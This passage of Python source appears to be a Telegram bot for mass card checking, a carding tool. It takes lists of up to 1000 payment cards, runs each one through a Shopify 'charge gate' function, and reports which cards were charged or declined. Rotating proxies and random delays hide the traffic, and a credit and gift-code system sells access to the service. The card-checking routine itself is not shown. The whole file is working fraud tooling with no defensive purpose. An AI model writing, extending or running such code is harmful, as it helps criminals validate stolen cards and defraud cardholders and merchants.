            "━━━━━━━━━𝙋𝙚𝙧𝙛𝙤𝙧𝙢𝙖𝙣𝙘𝙚━━━━━━━━━\n"
            f"⚡ 𝘾𝙋𝙈 ⭆ {cpm:.1f} cards/min\n"
            f"⏱️ 𝘼𝙫𝙜 𝙏𝙞𝙢𝙚 ⭆ {avg_time:.2f}s\n"
            "━━━━━━━━━𝙎𝙄𝙏𝙀 ⭟ 𝙨𝙝𝙤𝙥𝙞𝙛𝙮 ━━━━━━━━━\n"
            f"🌐 𝙐𝙨𝙖𝙗𝙡𝙚 𝙋𝙧𝙤𝙭𝙮 ⭆ {len(PROXIES) if PROXIES else 0}\n"
            f"🚫 𝘽𝙖𝙣𝙣𝙚𝙙 ⭆ 𝙉𝙤𝙣𝙚\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📄 File: {os.path.basename(file_name)}\n"
            f"👤 By: {chat_id}\n"  # Note: Changed to chat_id, but if you have username, use it
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "𝙐𝙎𝙀 /stop 𝙏𝙤 𝙎𝙩𝙤𝙥",
            version=2
        )
        try:
            await bot.edit_message_text(text=text, chat_id=chat_id, message_id=message_id, parse_mode="MarkdownV2")
        except Exception as e:
            logger.warning(f"Failed to update progress message: {e}")
        if checked >= total:
            break

# ---------------- /msh mass-check command ----------------
async def msh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, _, _ = get_msg_user_info(update)

    if context.args:
        card_list_raw = " ".join(context.args)
    else:
        full = msg.text or ""
        parts = full.split(maxsplit=1)
        card_list_raw = parts[1] if len(parts) >= 2 else ""

    if not card_list_raw:
        await msg.reply_text("𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙤𝙧𝙢𝙖𝙩𝙩 𝙪𝙨𝙚 /𝙢𝙨𝙝 <𝙘𝙖𝙧𝙙> \n <𝙘𝙖𝙧𝙙> \n <𝙘𝙖𝙧𝙙>")
        return

    cards = [card.strip() for card in re.split(r'[\n\s]+', card_list_raw) if card.strip()]
    username = msg.from_user.username or "USER"

    # For inline /msh, use a placeholder file_name
    asyncio.create_task(process_card_list(update, context, cards, username, file_name="inline_cards.txt"))

# ---------------- Mass-check helpers (process_card_list) ----------------
# Updated to accept optional file_name and start progress updater
async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, username: str, file_name: str = "cards.txt"):
    msg, user, user_id, username = get_msg_user_info(update)

    if not username:
        username = "USER"

    if not cards:
        await msg.reply_text("𝙉𝙊 𝙫𝙖𝙡𝙞𝙙 𝘾𝙖𝙧𝙙𝙨 𝙁𝙤𝙪𝙣𝙙 ᚏ 𝙤𝙣𝙚 𝙘𝙖𝙧𝙙 𝙥𝙚𝙧 𝙡𝙞𝙣𝙚 𝙤𝙣𝙡𝙮")
        return

    total_cards = len(cards)
    if total_cards > 1000:
        await msg.reply_text(f"𝙏𝙊𝙊 𝙢𝙖𝙣𝙮 𝙘𝙖𝙧𝙙𝙨. 𝙊𝙣𝙡𝙮 1000 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙤𝙛  {total_cards}.")
        return

    credits = get_user_credits(user_id)
    if credits < total_cards:
        await msg.reply_text(f"❌ 𝙄𝙣𝙨𝙪𝙛𝙛. 𝘾𝙧𝙚𝙙𝙞𝙩𝙨. 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 {credits} 𝙘𝙧𝙚𝙙𝙞𝙩𝙨. {total_cards} 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙")
        return

    bulk_start_time = time.time()

    proxy_info = ""
    if proxy_list:
        proxy = get_random_proxy()
        if proxy:
            proxy_host = proxy['http'].split('@')[-1]
            is_working, proxy_ms = await asyncio.to_thread(test_proxy, proxy)
            if is_working:
                proxy_info = f"🔒 𝙥𝙧𝙤𝙭𝙮 ⭆: `{proxy_host}` ({proxy_ms}ms)"
            else:
                proxy_info = f"𝙋𝙧𝙤𝙭𝙮 ⭆ `{proxy_host}` (𝙉𝙤𝙣 𝙍𝙚𝙨𝙥𝙤𝙣𝙙𝙞𝙣𝙜)"

    start_msg = f"{total_cards} 𝙘𝙖𝙧𝙙𝙨 𝙧𝙚𝙘𝙞𝙚𝙫𝙚𝙙. 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙡𝙡 𝙨𝙤𝙤𝙣 𝙖𝙥𝙥𝙚𝙖𝙧. 𝙎𝙏𝘼𝙔 𝙏𝙐𝙉𝙀𝘿 ♞"
    if proxy_info:
        start_msg += f"\n{proxy_info}"

    await msg.reply_text(start_msg, parse_mode='Markdown')

    global CHECKED, TOTAL, CHARGED, ERROR, DECLINED, STOP_CHECKING
    TOTAL = total_cards
    CHECKED = CHARGED = DECLINED = ERROR = 0  # Reset globals if needed
    STOP_CHECKING = False  # Ensure reset at start

    # Send initial progress message and start updater task
    progress_message = await msg.reply_text("𝘾𝙤𝙤𝙠𝙞𝙣𝙜 𝙃𝙖𝙧𝙙 ♨")
    asyncio.create_task(update_progress_message(context.bot, msg.chat.id, progress_message.message_id, bulk_start_time, file_name))

    successful = 0
    declined = 0
    errors = 0

    for i, card_details in enumerate(cards):
        if STOP_CHECKING:
            break  # Stop if /stop was called

        try:
            deduct_credit(user_id)
        except Exception as e:
            logger.warning(f"deduct_credit failed for {user_id}: {e}")

        if i > 0:
            if asyncio.iscoroutinefunction(random_delay):
                await random_delay(1, 2)
            else:
                await asyncio.to_thread(random_delay, 1, 2)

        result_text = ""
        try:
            # call sh_check – handle async/sync
            if asyncio.iscoroutinefunction(sh_check):
                result = await sh_check(card_details, username)
            else:
                result = await asyncio.to_thread(sh_check, card_details, username)

            if isinstance(result, str):
                card_to_display = card_details
                response_msg = f"Error: {result}"
                errors += 1
            else:
                card_to_display = result.get('full_card', card_details)
                response_msg = result.get('resp_msg', '')

                if "CHARGED" in result.get('status', '') or "ORDER_PLACED" in response_msg:
                    CHARGED += 1
                    successful += 1
                    CHECKED += 1
                elif "DECLINED" in result.get('status', ''):
                    DECLINED += 1
                    declined += 1
                    CHECKED += 1
                else:
                    ERROR += 1
                    errors += 1
                    CHECKED += 1

            safe_card = card_to_display.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
            result_text = f"Card: `{safe_card}`\nResponse: *{response_msg}*"

        except Exception as e:
            logger.exception(f"Error processing card {card_details}: {e}")
            safe_card = card_details.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
            result_text = f"Card: `{safe_card}`\nResponse: *Processing Error ❗️*"
            ERROR += 1
            errors += 1

        try:
            await context.bot.send_message(chat_id=msg.chat.id, text=result_text, parse_mode='Markdown')
        except Exception as e:
            logger.warning(f"Failed to send per-card message: {e}")

        # No manual edit here - updater task handles it every 3s

    total_time = time.time() - bulk_start_time
    avg_time = total_time / total_cards if total_cards else 0.0
    remaining_credits = get_user_credits(user_id)

    status_title = "𝘾𝙤𝙤𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 ⎈" if not STOP_CHECKING else "𝙁𝙞𝙧𝙚 𝙀𝙨𝙩𝙞𝙣𝙦𝙪𝙞𝙨𝙝𝙚𝙙 ↺"
    completion_msg = f"""{status_title}
━━━━━━━━━━━━━
𝙎𝙏𝘼𝙏𝙎 ⭚\n
• 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 ⭆ {CHECKED}/{total_cards}\n\n
• 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 ⭆ {successful} 🔥\n\n
• 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ⭆ {declined} ❌\n\n
• 𝙀𝙧𝙧𝙤𝙧𝙨 ⭆ {errors}\n\n

⏱️ 𝙏𝙞𝙢𝙞𝙣𝙜 ⭛
• 𝙏𝙤𝙩𝙖𝙡 𝙏𝙞𝙢𝙚 ⭆ {total_time:.2f}s
• 𝘼𝙫𝙜 𝙏𝙞𝙢𝙚 ⭆ {avg_time:.2f}s
• 𝙎𝙥𝙚𝙚𝙙 ⭆ { (CHECKED/total_time*60) if total_time>0 else 0:.1f} 𝙘𝙖𝙧𝙙𝙨/𝙢𝙞𝙣

💳 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ⭝
• 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 ⭆ {remaining_credits}
"""

    if proxy_info:
        completion_msg += f"\n{proxy_info}"

    completion_msg += "\n━━━━━━━━━━━━━\nᓀ ᓂ 𝘿𝙚𝙫 ⭆ 𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽 ☢"

    await context.bot.send_message(chat_id=msg.chat.id, text=completion_msg, parse_mode='Markdown')

    STOP_CHECKING = True  # Signal updater to stop (it checks this)
    await asyncio.sleep(1)  # Give updater time to notice
    STOP_CHECKING = False  # Reset for next run

# ---------------- Proxy utilities & commands ----------------
async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global proxy_list
    msg, _, _, _ = get_msg_user_info(update)
    if not context.args:
        await msg.reply_text("𝙀𝙣𝙩𝙚𝙧 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙬𝙞𝙩𝙝 𝙞𝙩 ❌\n𝙐𝙨𝙖𝙜𝙚 ⤍ `/addproxy ip:port:user:pass`", parse_mode='Markdown')
        return

    proxy_string = " ".join(context.args).strip()
    parts = proxy_string.split(':')
    if len(parts) != 4:
        await msg.reply_text("𝙁𝙤𝙧𝙢𝙖𝙩𝙩 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 \n 𝙐𝙨𝙚 𝙧𝙤𝙩𝙖𝙩𝙞𝙣𝙜 𝙥𝙧𝙤𝙭𝙮 𝙛𝙧𝙤𝙢 𝙒𝙚𝙗𝙨𝙝𝙖𝙧𝙚.𝙞𝙤 ❌\n𝙐𝙨𝙚 ⤍ `/addproxy ip:port:user:pass`", parse_mode='Markdown')
        return

    ip, port, user, password = parts
    proxy_url = f"http://{user}:{password}@{ip}:{port}"
    new_proxy = {"http": proxy_url, "https": proxy_url}
    testing_msg = await msg.reply_text(f"🔍 Testing proxy: `{ip}:{port}`\nPlease wait...", parse_mode='Markdown')

    is_working, response_time = await asyncio.to_thread(test_proxy, new_proxy)

    if is_working:
        proxy_list.append(new_proxy)
        try:
            await context.bot.edit_message_text(
                chat_id=testing_msg.chat.id,
                message_id=testing_msg.message_id,
                text=(
                    f"𝘼𝙙𝙙𝙚𝙙 𝙉𝙚𝙬 𝙋𝙧𝙤𝙭𝙮 ⍈\n\n"
                    f"📍 𝙋𝙧𝙤𝙭𝙮 ⭆ `{ip}:{port}`\n"
                    f"𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 𝙩𝙞𝙢𝙚 ⭆ `{response_time}ms`\n"
                    f"𝙏𝙤𝙩𝙖𝙡 𝙋𝙧𝙤𝙭𝙮 ⭆ `{len(proxy_list)}`"
                ),
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.warning(f"Failed to edit testing message in add_proxy: {e}")
    else:
        try:
            await context.bot.edit_message_text(
                chat_id=testing_msg.chat.id,
                message_id=testing_msg.message_id,
                text=(
                    f"𝙋𝙧𝙤𝙭𝙮 𝙏𝙚𝙨𝙩 𝙁𝙖𝙞𝙡𝙚𝙙 ⭖\n\n"
                    f"📍 𝙋𝙧𝙤𝙭𝙮 ⭆ `{ip}:{port}`\n\n"
                    f"𝙎𝙩𝙖𝙩𝙪𝙨 ⭙ 𝙉𝙤𝙩 𝙒𝙤𝙧𝙠𝙞𝙣𝙜/𝙏𝙞𝙢𝙚𝙤𝙪𝙩\n\n"
                    f"💡 𝙂𝙚𝙩 𝙍𝙤𝙩𝙖𝙩𝙞𝙣𝙜 𝙋𝙧𝙤𝙭𝙮 𝙁𝙧𝙤𝙢 𝙒𝙚𝙗𝙨𝙝𝙖𝙧𝙚.𝙞𝙤"
                ),
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.warning(f"Failed to edit testing message in add_proxy (fail): {e}")

async def remove_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global proxy_list
    msg, _, _, _ = get_msg_user_info(update)
    proxy_list.clear()
    await msg.reply_text("𝙍𝙚𝙢𝙤𝙫𝙚𝙙 𝙖𝙡𝙡 𝙋𝙧𝙤𝙭𝙞𝙚𝙨 ⨷")

async def my_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, _, _ = get_msg_user_info(update)
    if proxy_list:
        testing_msg = await msg.reply_text("🔍 𝙏𝙚𝙨𝙩𝙞𝙣𝙜 𝙖𝙡𝙡 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 \n𝙒𝙖𝙞𝙩..........⨰")
        proxy_status = []
        for idx, proxy in enumerate(proxy_list, 1):
            host = proxy['http'].split('@')[-1]
            is_working, response_time = await asyncio.to_thread(test_proxy, proxy)
            if is_working:
                status = f"{idx}. `{host}` - ✅ {response_time}ms"
            else:
                status = f"{idx}. `{host}` - ❌ 𝙉𝙤𝙩 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 ⨴⨵"
            proxy_status.append(status)

        proxy_info = "\n".join(proxy_status)
        try:
            await context.bot.edit_message_text(
                chat_id=testing_msg.chat.id,
                message_id=testing_msg.message_id,
                text=f"𝘾𝙪𝙧𝙧𝙚𝙣𝙩 𝙋𝙧𝙤𝙭𝙞𝙚𝙨 ⭆ ({len(proxy_list)})**\n\n{proxy_info}",
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.warning(f"𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙚𝙙𝙞𝙩 𝙥𝙧𝙤𝙭𝙮 {e}")
    else:
        await msg.reply_text("𝙉𝙤 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 𝙨𝙚𝙩 \n 𝙂𝙚𝙩 𝙧𝙤𝙩𝙖𝙩𝙞𝙣𝙜 𝙥𝙧𝙤𝙭𝙮 𝙛𝙧𝙤𝙢 𝙒𝙚𝙗𝙨𝙝𝙖𝙧𝙚.𝙞𝙤")

# ---------------- Credits, redeem, admin commands ----------------
async def check_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)

    try:
        add_user(user_id, username)
    except Exception:
        pass

    try:
        data = load_data()
        user_id_str = str(user_id)
        if user_id_str in data['users']:
            u = data['users'][user_id_str]
            credits = u.get('credits', 0)
            total_checks = u.get('total_checks', 0)
            await msg.reply_text(f"💳 𝙔𝙊𝙐𝙍 𝘼𝘾𝘾𝙊𝙐𝙉𝙏\n\n 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ⭆ {credits}\n 𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙨 ⭆ {total_checks}\n\n𝙐𝙨𝙚 /redeem 𝙩𝙤 𝙖𝙙𝙙 𝙢𝙤𝙧𝙚 𝙘𝙧𝙚𝙙𝙞𝙩𝙨!", parse_mode='Markdown')
        else:
            await msg.reply_text("💳 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ⭆0\n 𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙨 ⭆ 0\n\n𝙐𝙨𝙚 /redeem 𝙩𝙤 𝙖𝙙𝙙 𝙘𝙧𝙚𝙙𝙞𝙩𝙨", parse_mode='Markdown')
    except Exception as e:
        logger.warning(f"check_credits failed: {e}")
        await msg.reply_text("Could not load your credits data.")

async def redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)
    add_user(user_id, username)

    if not context.args:
        await msg.reply_text("❌ 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙤𝙧𝙢𝙖𝙩𝙩 /redeem CODE")
        return

    code = " ".join(context.args).strip().upper()
    try:
        success, result = redeem_gift_code(code, user_id)
        if success:
            new_credits = get_user_credits(user_id)
            await msg.reply_text(f"𝙂𝙄𝙁𝙏 𝙘𝙤𝙙𝙚 𝙧𝙚𝙙𝙚𝙚𝙢 𝙨𝙪𝙘𝙘𝙚𝙨𝙨 ⭝\n\n𝘼𝘿𝘿𝙀𝘿 ⭆ {result} 𝘾𝙧𝙚𝙙𝙞𝙩𝙨\n💳 𝙏𝙤𝙩𝙖𝙡 𝙘𝙧𝙚𝙙𝙞𝙩𝙨 ⭆ {new_credits}")
        else:
            await msg.reply_text(f"❌ {result}")
    except Exception as e:
        logger.exception(f"redeem_code error: {e}")
        await msg.reply_text("An error occurred while redeeming the code.")

async def generate_gift(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)

    if user_id != ADMIN_CHAT_ID:
        await msg.reply_text("❌ 𝙐𝙉𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙘𝙤𝙢𝙢𝙖𝙣𝙙")
        return

    if not context.args:
        await msg.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙁𝙤𝙧𝙢𝙖𝙩𝙩. 𝙐𝙨𝙚 /gift <credits>\n𝙚.𝙜. /gift 100")
        return

    try:
        credits = int(context.args[0])
        if credits <= 0:
            await msg.reply_text("❌ Credits must be a positive number.")
            return

        code = generate_gift_code(credits, user_id)
        await msg.reply_text(f"𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 ⭐\n\n 𝘾𝙤𝙙𝙚 ⭆ `{code}`\n 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ⭆ {credits}\n\n 𝙎𝙝𝙖𝙧𝙚 𝙩𝙤 𝙐𝙨𝙚𝙧𝙨 ⭛", parse_mode='Markdown')
    except ValueError:
        await msg.reply_text("❌ 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙖𝙢𝙤𝙪𝙣𝙩")
    except Exception as e:
        logger.exception(f"generate_gift error: {e}")
        await msg.reply_text(f"❌ Error generating gift code: {e}")


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button selections."""
    query = update.callback_query
    await query.answer()
    if query.data == "opt1":
        await query.edit_message_text("⚡ *Selected CHARGE-GATES* ⚡\nUpload a TXT file and reply with /st to start.", parse_mode="Markdown")
    elif query.data == "opt2":
        await query.edit_message_text("💳 *Selected FREE-GATES* 💳\nUpload a TXT file and reply with /st to start.", parse_mode="Markdown")
        
        
async def add_credits_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)

    if user_id != ADMIN_CHAT_ID:
        await msg.reply_text("❌ 𝙐𝙉𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 ")
        return

    if len(context.args) < 2:
        await msg.reply_text("❌ 𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙛𝙤𝙧𝙢𝙖𝙩𝙩. 𝙐𝙨𝙚 /addcredits <user_id> <credits>\nExample: /addcredits 123456789 100")
        return

    try:
        target_user_id = int(context.args[0])
        credits = int(context.args[1])
        if credits <= 0:
            await msg.reply_text("❌ Credits must be a positive number.")
            return

        add_credits(target_user_id, credits)
        new_balance = get_user_credits(target_user_id)
        await msg.reply_text(f"✅ Credits added successfully!\n\n👤 User ID: {target_user_id}\n💰 Added: {credits} credits\n💳 New Balance: {new_balance}")
    except ValueError:
        await msg.reply_text("❌ Invalid input. Please provide valid numbers.")
    except Exception as e:
        logger.exception(f"add_credits_admin error: {e}")
        await msg.reply_text(f"❌ Error adding credits: {e}")

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)

    if user_id != ADMIN_CHAT_ID:
        await msg.reply_text("❌ You are not authorized to use this command.")
        return

    try:
        data = load_data()
        total_users = len(data['users'])
        total_checks = sum(u.get('total_checks', 0) for u in data['users'].values())
        unused_codes = sum(1 for code in data['gift_codes'].values() if not code['is_used'])
        used_codes = sum(1 for code in data['gift_codes'].values() if code['is_used'])

        stats_text = f"""📊 **Bot Statistics**
━━━━━━━━━━━━━
𝙏𝙊𝙏𝘼𝙇 𝙐𝙎𝙀𝙍𝙎 ⭆ {total_users}\n\n
𝙏𝙊𝙏𝘼𝙇 𝘾𝙃𝙀𝘾𝙆𝙎 ⭆ {total_checks}\n\n
𝘼𝘾𝙏𝙄𝙑𝙀 𝘾𝙊𝘿𝙀𝙎 ⭆ {unused_codes}\n\n
𝙍𝙀𝘿𝙀𝙀𝙈𝙀𝘿 𝘾𝙊𝘿𝙀𝙎 ⭆ {used_codes}\n\n
━━━━━━━━━━━━━\n 𝘼𝘿𝙈𝙄𝙉 ᚕ @technopile
"""
        await msg.reply_text(stats_text, parse_mode='Markdown')
    except Exception as e:
        logger.exception(f"show_stats error: {e}")
        await msg.reply_text(f"❌ Error fetching stats: {e}")

# ---------------- MAIN ----------------
def main():
    if not TOKEN or TOKEN == "your_token_here":
        logger.error("TELEGRAM_BOT_TOKEN not set. Set it in environment variables.")
        return

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", start_command))
    app.add_handler(CommandHandler("sort", sort_command))
    app.add_handler(CommandHandler("sh", sh_command))
    app.add_handler(CommandHandler("msh", msh_command))
    app.add_handler(CommandHandler("addproxy", add_proxy))
    app.add_handler(CommandHandler("removeproxies", remove_proxies))
    app.add_handler(CommandHandler("myproxies", my_proxies))
    app.add_handler(CommandHandler("credits", check_credits))
    app.add_handler(CommandHandler("redeem", redeem_code))
    app.add_handler(CommandHandler("gift", generate_gift))
    app.add_handler(CommandHandler("addcredits", add_credits_admin))
    app.add_handler(CommandHandler("stats", show_stats))
    app.add_handler(MessageHandler(filters.Document.ALL, document_handler))

    logger.info("Starting bot (python-telegram-bot)...")
    app.run_polling()

if __name__ == "__main__":
    main()
